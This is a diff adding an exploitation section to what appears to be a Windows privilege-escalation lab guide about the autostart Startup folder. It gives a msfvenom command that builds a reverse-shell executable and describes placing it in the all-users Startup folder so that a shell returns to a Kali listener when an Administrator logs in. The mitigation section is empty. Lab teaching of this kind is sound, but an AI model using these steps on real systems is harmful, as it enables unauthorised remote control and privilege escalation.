@@ -93,6 +93,28 @@ Outcome:
 
 ## Exploitation
 
+1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the booting of the victim's machine:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
+```
+
+2) Transfer the malicious executable file to victim's machine.
+
+3) Move the malicious executable file to 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'.
+
+Outcome:
+
+![AutostartStartupFolder-Exploitation](/Pictures/AutostartStartupFolder-Exploitation.png)
+
+4) Open a listener on your Kali machine.
+
+5) Reboot the victim's machine and login as Adminstrator:
+
+![Reboot-victim-machine](/Pictures/Reboot-Victim-Machine2.png)
+
+6) Verify the reverse shell on your Kali machine:
+
 ## Mitigation
 
 ## References
